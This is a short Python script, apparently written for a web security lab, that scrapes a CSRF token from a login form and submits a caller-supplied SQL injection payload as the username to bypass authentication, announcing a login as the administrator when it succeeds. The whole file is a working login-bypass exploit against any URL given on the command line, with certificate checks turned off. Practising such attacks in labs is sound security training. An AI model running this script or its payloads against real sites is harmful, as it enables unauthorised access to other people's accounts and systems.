import requests 
import sys 
import urllib3
from bs4 import BeautifulSoup 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csfr_token(s, url):
    r = s.get(url, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    print("this is the soup : ",soup)
    print("this is the csrf ", soup.find('input'))
    csfr = soup.find('input')['value']
    return csfr

def exploit_sqli(s, url, sqli_Payload):
    csrf = get_csfr_token(s, url)
    data = {
        'csrf' : csrf, 
        'username' : sqli_Payload,
        'password' : 'random'
    }
    print('[+] Logging In........')
    r =  s.post(url, data=data, verify=False )
    res = r.text 
    print("[+] Got Response..")
    if 'Log out' in res:
        return True
    else:
        return False


if __name__=='__main__':
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <sql.payload>"%sys.argv[0])
        print('[-] Example: %s www.example.com "1-1"'%sys.argv[0])


    s = requests.Session()

    if exploit_sqli(s, url, sqli_payload):
        print('[+] SQL inejection successfully! Logged in as the administrator')
    else:
        print('[-] SQL Injection Failed')